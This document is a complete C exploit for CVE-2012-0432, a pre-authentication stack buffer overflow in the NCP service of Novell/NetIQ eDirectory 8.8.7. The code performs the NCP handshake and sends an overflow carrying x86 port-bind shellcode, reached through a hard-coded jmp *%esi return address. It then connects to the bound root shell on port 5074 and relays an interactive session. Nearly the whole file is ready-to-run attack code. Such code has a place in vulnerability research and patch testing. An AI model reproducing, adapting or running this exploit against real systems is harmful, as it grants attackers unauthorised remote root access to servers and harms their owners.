********** BEGIN EXPLOIT **********

/*
 * Novell NCP Pre-Auth Remote Root Exploit
 * Written by Gary Nilson 11-17-2013
 *
 * Overview (US-CERT/NIST CVES:CVE-2012-0432):
 *   Stack-based buffer overflow in the Novell NCP implementation in
 *   NetIQ eDirectory 8.8.7.x before 8.8.7.2 allows remote attackers to have an
 *   unspecified impact via unknown vectors.
 *
 * Fix: Issues resolved in eDirectory 8.8 SP7 Patch 2 (20703.00)
 *
 * Exploited Platform:
 *   Novell eDirectory 8.8 SP7 v20701.48
 *   Distribution: Debian GNU/Linux 6.0.6 (squeeze)
 *   Linux Kernel: 2.6.32-5-686
 *
 * Discovery: David Klein (david.r.klein at 676D61696)
 *
 */

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/ioctl.h>


/*
 * Due to address space randomization on my platform I had to rely on the
 * following in order to reliably execute the payload:
 *   - At the moment that %eip is overwritten, %esi happens to point
to the payload
 *     located on the heap (horray).
 *   - Address spaced mapped from 0x08087000-0x080a6000 (Data segment) contains
 *     the handy instruction jmp *%esi (located at 0x080a4697).
 */
#define NCP_PORT 524
#define SHELL_BIND_PORT 5074
#define RET_ADDRESS 0x080a4697
#define RET_PAYLOAD_OFFSET 65
#define PORT_PAYLOAD_OFFSET 24
#define PAYLOAD_SIZE 190
#define SHELL_CONNECT_DELAY 10

int main(int argc, char **argv){

  struct hostent *host;
  struct sockaddr_in target_addr;
  int sockfd;
  fd_set rdfdset, fdsave;;

  int len_in;
  int i;
  int payload_size;
  int ret_address;
  short shell_port;

  int msg1_buffsize;
  int msg2_headersize;
  int recv_buffsize;
  int shellcode_size;

  char iochar;
  char *msg2_buff;
  char *recv_buff;

  /* Shellcode (adapted):
   * s0t4ipv6 () Shellcode com ar
   * x86 portbind a shell in port 5074
   */

  char port_bind[] = "\xeb\x04"                         /* jmp +4 bytes    */
                     "\x00\x00\x00\x00"                 /* eip             */
                     "\x31\xc0\x50\x40\x89\xc3\x50\x40" /* begin shellcode */
                     "\x50\x89\xe1\xb0\x66\xcd\x80\x31"
                     "\xd2\x52\x66\x68\x13\xd2\x43\x66"
                     "\x53\x89\xe1\x6a\x10\x51\x50\x89"
                     "\xe1\xb0\x66\xcd\x80\x40\x89\x44"
                     "\x24\x04\x43\x43\xb0\x66\xcd\x80"
                     "\x83\xc4\x0c\x52\x52\x43\xb0\x66"
                     "\xcd\x80\x93\x89\xd1\xb0\x3f\xcd"
                     "\x80\x41\x80\xf9\x03\x75\xf6\x52"
                     "\x68\x6e\x2f\x73\x68\x68\x2f\x2f"
                     "\x62\x69\x89\xe3\x52\x53\x89\xe1"
                     "\xb0\x0b\xcd\x80";


  char msg1[] = "\x44\x6d\x64\x54" /* NCP TCP id */
                "\x00\x00\x00\x17"
                "\x00\x00\x00\x01\x00\x00\x00\x00"
                "\x11\x11\x00\x00\x00\x00\x00";

  char recv[] = "\x74\x4e\x63\x50" /* TCP RCVD id              */
                "\x00\x00\x00\x10" /* length ?                 */
                "\x33\x33"         /* service connection reply */
                "\x00"             /* sequence number          */
                "\x10"             /* connection number        */
                "\x00"             /* task number              */
                "\x00"             /* reserved                 */
                "\x00"             /* completion code          */
                "\x00";            /* ??                       */

  /* special thanks to the ncpfs source */
  char msg2_header[] = "\x44\x6d\x64\x54"  /* NCP TCP id                     */
                        "\x00\x00\x01\xa0" /* request_size + 16 + siglen + 6 */
                        "\x00\x00\x00\x01" /* version (1)                    */
                        "\x00\x00\x00\x05" /* (reply buffer size)            */
                                           /* signature would go here        */
                        "\x22\x22"         /* cmd                            */
                        "\x01"             /* conn->sequence                 */
                        "\x0f"             /* conn->i.connection ???         */
                        "\x00"             /* task (1)                       */
                        "\x00"             /* conn->i.connection >> 8        */
                        "\x17"             /* Login Object FunctionCode (23) */
                        "\x00\xa7"         /* SubFuncStrucLen                */
                        "\x18"             /* SubFunctionCode (20)           */
                        "\x90\x90"         /* object type                    */
                        "\x50";            /* ClientNameLen                  */

  if (argc != 2){
    fprintf(stderr, "Syntax error: usage: %s target\n", argv[0]);
    exit(EXIT_FAILURE);
  }

  msg1_buffsize = sizeof(msg1)/(sizeof(msg1[0]))-1;
  msg2_headersize = sizeof(msg2_header)/(sizeof(msg2_header[0]))-1;
  recv_buffsize = sizeof(recv)/sizeof(recv[0])-1;
  shellcode_size = sizeof(port_bind)/sizeof(port_bind[0])-1;
  printf("Novell NCP Pre-Auth Remote Stack Buffer Overflow\n");

  memset(&target_addr, 0, sizeof(target_addr));
  target_addr.sin_family = AF_INET;
  target_addr.sin_port = htons(NCP_PORT);

  if ((host = (struct hostent *)gethostbyname(argv[1])) == NULL){
    perror("Error looking up hostname");
    exit(EXIT_FAILURE);
  }

  memcpy(&target_addr.sin_addr, host->h_addr_list[0], host->h_length);

  printf("Connecting to host [%s]...\n", argv[1]);

  if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0){
    perror("Error creating socket");
    exit(EXIT_FAILURE);
  }

  if ((connect(sockfd,
               (const struct sockaddr *)&target_addr,
               sizeof(target_addr))) < 0){
    perror("Unable to connect to host");
    close(sockfd);
    exit(EXIT_FAILURE);
  }
  printf("Connected!\n");
  printf("Sending message #1 (%d bytes)\n", msg1_buffsize);

  if (write(sockfd, msg1, msg1_buffsize) < 0){
    perror("Error sending msg1");
    close(sockfd);
    exit(EXIT_FAILURE);
  }
  printf("\n<-- ");
  for (i = 0; i < msg1_buffsize; i++)
    printf("%.2x ", msg1[i]);
  printf("\n\n");

  printf("Waiting for response (%d bytes)...\n", recv_buffsize);

  recv_buff = malloc(recv_buffsize);
  len_in = read(sockfd, recv_buff, recv_buffsize);
  printf("Received %d bytes (expecting %d)\n", len_in, recv_buffsize);

  printf("\n--> ");
  for (i = 0; i < recv_buffsize; i++)
    printf("%.2x ", recv_buff[i]);
  printf("\n\n");

  if (memcmp(recv_buff, recv, 4) == 0)
    printf("Response #1 is valid, continue exploitation\n");
  else{
    printf("Response $1 does not match, aborting!\n");
    close(sockfd);
    free(recv_buff);
  }

  printf("Received response connection number %.2x\n", (char) recv_buff[11]);
  printf("Sending payload (%d bytes)...\n", PAYLOAD_SIZE);

  msg2_buff = malloc(PAYLOAD_SIZE);
  memset(msg2_buff, 0x90, PAYLOAD_SIZE);
  memcpy(msg2_buff, msg2_header, msg2_headersize);

  // yes, this assumes we are little endian
  payload_size = htonl(PAYLOAD_SIZE);
  memcpy(msg2_buff+4, &payload_size, 4);
  memcpy(msg2_buff+msg2_headersize+RET_PAYLOAD_OFFSET-2, port_bind,
shellcode_size);

  ret_address = RET_ADDRESS;
  memcpy(msg2_buff+msg2_headersize+RET_PAYLOAD_OFFSET, &ret_address, 4);
  shell_port = htons(SHELL_BIND_PORT);
  memcpy(msg2_buff+msg2_headersize+RET_PAYLOAD_OFFSET+PORT_PAYLOAD_OFFSET,
&shell_port, 2);

  msg2_buff[19] = recv_buff[11];
  free(recv_buff);

  printf("\n<-- ");
  for (i = 0; i < PAYLOAD_SIZE; i++)
    printf("%.2x ", msg2_buff[i] & 0xff);
  printf("\n\n");

  if ((i = write(sockfd, msg2_buff, PAYLOAD_SIZE)) < 0){
    perror("Error sending msg2");
    close(sockfd);
    free(msg2_buff);
    exit(EXIT_FAILURE);
  }
  else
    printf("%d bytes sent\n", i, PAYLOAD_SIZE);

  close(sockfd);
  free(msg2_buff);

  printf("Attempting to connect to shell at port %d...\n", SHELL_BIND_PORT);
  target_addr.sin_port = htons(SHELL_BIND_PORT);

  if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0){
    perror("Error creating socket");
    exit(EXIT_FAILURE);
  }

  printf("Sleeping for %d seconds...\n", SHELL_CONNECT_DELAY);
  sleep(SHELL_CONNECT_DELAY);

  if ((connect(sockfd,
               (const struct sockaddr *)&target_addr,
               sizeof(target_addr))) < 0){
    perror("Unable to connect to host");
    close(sockfd);
    exit(EXIT_FAILURE);
  }
  printf("Success!\n");

  FD_ZERO(&rdfdset);
  FD_SET(STDIN_FILENO, &rdfdset);
  FD_SET(sockfd, &rdfdset);
  len_in = 0;

  fdsave = rdfdset;

  while (1){

    if (select(sockfd+1, &rdfdset, NULL, NULL, NULL) < 0){
      perror("Select error");
      close(sockfd);
      exit(EXIT_FAILURE);
    }

    for (i=STDIN_FILENO; i<=sockfd; i++){
      if (FD_ISSET(i, &rdfdset)){
        ioctl(i, FIONREAD, &len_in);
        if (len_in == 0){
          printf("Connection closed\n");
          exit(EXIT_SUCCESS);
        }

        while (len_in--){
          read(i, &iochar, 1);
          write(i == sockfd ? STDOUT_FILENO : sockfd, &iochar, 1);
        }

      }

    }

    rdfdset = fdsave;
  }

}

